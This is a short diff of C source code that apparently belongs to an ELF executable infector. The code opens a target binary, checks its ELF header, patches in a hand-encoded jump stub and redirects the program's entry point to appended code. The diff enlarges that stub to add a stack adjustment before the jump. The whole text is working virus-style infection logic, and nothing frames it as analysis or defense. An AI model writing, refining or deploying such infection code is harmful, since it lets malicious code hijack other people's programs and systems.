@@ -131,8 +131,7 @@ label1: ;
 	unsigned long code_size;
 	unsigned long real_code_size;
 	Elf64_Half p;
-	unsigned char jmp[12];
-
+	unsigned char jmp[19];
 
 	a[0] = 'a';
 	a[1] = 'a';
@@ -144,7 +143,6 @@ label1: ;
 	volatile long fd = open(a, O_RDWR, 0);
 	if (fd < 0) {
 		goto label2;
-		//_exit(3);
 	}
 	volatile long n = read(fd, &ehdr, sizeof(ehdr));
 	if (ehdr.e_ident[0] != 0x7f
@@ -180,8 +178,17 @@ label1: ;
 			 */
 			jmp[0] = '\x48';
 			jmp[1] = '\xb8';
-			jmp[10] = '\xff';
-			jmp[11] = '\xe0';
+
+			jmp[10] = '\x48';
+			jmp[11] = '\x81';
+			jmp[12] = '\xc4';
+			jmp[13] = '\xf8';
+			jmp[14] = '\x02';
+			jmp[15] = '\x00';
+			jmp[16] = '\x00';
+
+			jmp[17] = '\xff';
+			jmp[18] = '\xe0';
 
 			/* some instructions after label2 are not copyed
 			 * so I use this space to add jump...
@@ -197,7 +204,7 @@ label1: ;
 			jmp[8] = c.b[6];
 			jmp[9] = c.b[7];
 			lseek(fd, 7, SEEK_CUR);
-			write(fd, jmp, 12);
+			write(fd, jmp, sizeof(jmp));
 
 			/* change elf header entry point */
 			ehdr.e_entry = phdr.p_vaddr + phdr.p_filesz;
